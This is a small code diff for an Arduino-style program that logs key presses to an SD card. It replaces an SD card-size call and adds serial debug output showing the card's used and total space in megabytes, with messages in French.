@@ -37,7 +37,7 @@ void setup() {
     Serial.println("SD card failed, or not present");
     return;
   }  
-    uint64_t cardSize = SD.cardSize() / (1024 * 1024);
+    uint64_t cardSize = SD.totalSize() / (1024 * 1024);
     Serial.print("Taille de la carte SD : ");
     Serial.print(cardSize);
     Serial.println(" Mo.");
@@ -98,6 +98,13 @@ void OnPress(int key) {
         // For the ouput for debugging
         Serial.print((char)key);
         Serial.println(dataLog.size());
+        uint64_t usedSize = SD.usedSize() / (1024 * 1024);
+        Serial.print("Taille utilisée : ");
+        Serial.print(usedSize);
+        Serial.print(" Mo./");
+        uint64_t cardSize = SD.totalSize() / (1024 * 1024);
+        Serial.print(cardSize);
+        Serial.println(" Mo.");
 
     }
 
